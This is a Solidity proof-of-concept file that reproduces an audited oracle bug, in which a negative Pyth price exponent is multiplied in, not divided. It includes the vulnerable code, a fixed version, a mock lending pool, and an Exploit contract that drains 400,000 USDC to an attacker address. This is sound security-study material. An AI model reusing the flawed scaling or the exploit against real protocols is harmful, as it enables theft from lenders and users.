// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — PythOracle._recordPrice ignores a negative exponent
    (Sherlock 2023-07, panprog, H-4).
    SYNTHETIC, cheatcode-free. The audited _recordPrice body is copied verbatim.
    price = 5, expo = -5 is worth 5e-5. The code multiplies by 10^|expo|
    instead of dividing, so it stores 5e5. A lender that trusts that price
    lets the holder of 1 collateral token borrow 400,000 USDC. The fair
    price would allow 40 base units (0.000040 USDC). */

library SafeCast {
    function toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "cast");
        return int256(value);
    }

    function toUint256(int256 value) internal pure returns (uint256) {
        require(value >= 0, "cast");
        return uint256(value);
    }
}

type Fixed6 is int256;

library Fixed6Lib {
    int256 internal constant UNIT = 1e6;

    function from(int256 value) internal pure returns (Fixed6) {
        return Fixed6.wrap(value * UNIT);
    }

    function mul(Fixed6 a, Fixed6 b) internal pure returns (Fixed6) {
        return Fixed6.wrap(Fixed6.unwrap(a) * Fixed6.unwrap(b) / UNIT);
    }

    function div(Fixed6 a, Fixed6 b) internal pure returns (Fixed6) {
        return Fixed6.wrap(Fixed6.unwrap(a) * UNIT / Fixed6.unwrap(b));
    }
}

using {Fixed6Lib.mul, Fixed6Lib.div} for Fixed6 global;

library PythStructs {
    struct Price {
        int64 price;
        uint64 conf;
        int32 expo;
        uint256 publishTime;
    }
}

interface IPriceOracle {
    function recorded(uint256 version) external view returns (int256);
    function commit(PythStructs.Price memory price) external;
}

contract CollateralToken {
    string public constant symbol = "COLL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract UsdToken {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract PythOracle is IPriceOracle {
    mapping(uint256 => Fixed6) private _prices;
    mapping(uint256 => uint256) private _publishTimes;

    function recorded(uint256 version) external view returns (int256) {
        return Fixed6.unwrap(_prices[version]);
    }

    function commit(PythStructs.Price memory price) external {
        _recordPrice(1, price);
    }

    /// @notice Audited PythOracle._recordPrice (PythOracle.sol).
    function _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {
        // @> VULN: |expo| is always a multiplier, so a negative exponent inflates the price
        _prices[oracleVersion] = Fixed6Lib.from(price.price).mul(
            Fixed6Lib.from(SafeCast.toInt256(10 ** SafeCast.toUint256(price.expo > 0 ? price.expo : -price.expo)))
        );
        _publishTimes[oracleVersion] = price.publishTime;
    }
}

contract PythOracleFixed is IPriceOracle {
    mapping(uint256 => Fixed6) private _prices;
    mapping(uint256 => uint256) private _publishTimes;

    function recorded(uint256 version) external view returns (int256) {
        return Fixed6.unwrap(_prices[version]);
    }

    function commit(PythStructs.Price memory price) external {
        _recordPrice(1, price);
    }

    /// @dev Divide when expo is negative. Same 10^|expo| scale, opposite direction.
    function _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {
        uint256 scale = 10 ** SafeCast.toUint256(price.expo > 0 ? price.expo : -price.expo);
        Fixed6 base = Fixed6Lib.from(price.price);
        if (price.expo < 0) {
            _prices[oracleVersion] = base.div(Fixed6Lib.from(SafeCast.toInt256(scale)));
        } else {
            _prices[oracleVersion] = base.mul(Fixed6Lib.from(SafeCast.toInt256(scale)));
        }
        _publishTimes[oracleVersion] = price.publishTime;
    }
}

contract LendingPool {
    uint256 public constant LTV_BPS = 8_000;
    CollateralToken public coll;
    UsdToken public usd;
    IPriceOracle public oracle;
    uint256 public lastMaxBorrow;

    constructor(CollateralToken coll_, UsdToken usd_, IPriceOracle oracle_) {
        coll = coll_;
        usd = usd_;
        oracle = oracle_;
    }

    function depositAndBorrow(uint256 collAmount, uint256 borrowAmount) external {
        coll.transferFrom(msg.sender, address(this), collAmount);
        uint256 value = uint256(oracle.recorded(1)) * collAmount / 1e18;
        uint256 maxBorrow = value * LTV_BPS / 10_000;
        lastMaxBorrow = maxBorrow;
        require(borrowAmount <= maxBorrow, "ltv");
        usd.transfer(msg.sender, borrowAmount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant ONE = 1e18;
    uint256 internal constant BORROW = 400_000e6;

    CollateralToken public coll;
    UsdToken public usd;
    PythOracle public oracle;
    LendingPool public pool;
    int256 public buggyPrice;
    int256 public fairPrice;
    uint256 public borrowed;

    function fairRaw(int64 price, int32 expo) public pure returns (int256) {
        uint256 scale = 10 ** uint256(uint32(expo < 0 ? -expo : expo));
        int256 base = int256(price) * 1e6;
        if (expo < 0) return base / int256(scale);
        return base * int256(scale);
    }

    function run() external {
        coll = new CollateralToken(); // nonce 1
        usd = new UsdToken(); // nonce 2
        oracle = new PythOracle(); // nonce 3
        pool = new LendingPool(coll, usd, oracle); // nonce 4

        coll.mint(address(this), ONE);
        usd.mint(address(pool), BORROW);
        coll.approve(address(pool), ONE);

        PythStructs.Price memory price = PythStructs.Price({price: 5, conf: 0, expo: -5, publishTime: 1});
        oracle.commit(price);

        buggyPrice = oracle.recorded(1);
        fairPrice = fairRaw(5, -5);
        require(buggyPrice == 500_000e6, "buggy price");
        require(fairPrice == 50, "fair price");
        require(buggyPrice / fairPrice == 10_000_000_000, "1e10");

        pool.depositAndBorrow(ONE, BORROW);
        usd.transfer(ATTACKER, BORROW);
        borrowed = usd.balanceOf(ATTACKER);
        require(borrowed == BORROW, "borrow");
    }
}
